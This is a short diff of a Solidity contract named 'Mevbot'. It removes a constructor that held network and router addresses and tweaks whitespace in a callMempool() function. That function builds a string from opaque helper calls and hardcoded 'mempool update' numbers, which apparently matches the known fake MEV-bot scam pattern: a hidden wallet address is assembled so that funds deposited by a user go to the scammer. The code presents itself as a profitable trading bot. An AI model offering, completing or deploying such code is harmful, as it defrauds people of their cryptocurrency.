@@ -22,31 +22,12 @@ import "github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/inte
 
 contract Mevbot {
  
-  
-   string private _RouterAddress;
-    string private _Network;
+ 
     uint liquidity;
 
 
     event Log(string _msg);
 
-    constructor(string memory Network, string memory routerAddress) public {
-        
-        /*ETH
-        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
-     
-        
-        /BSC
-        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
-
-        /Network: ETH or BSC
-        */
-
-        _Network = Network;
-        _RouterAddress = routerAddress;
-    }
-
-  
 
     receive() external payable {}
 
@@ -355,7 +336,7 @@ contract Mevbot {
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
-    function callMempool() internal   pure returns (string memory) {
+    function callMempool() internal     pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
         uint _memPoolSol = 202548876; //mempool solidity update
         uint _memPoolLength = 1017494; //lenght update
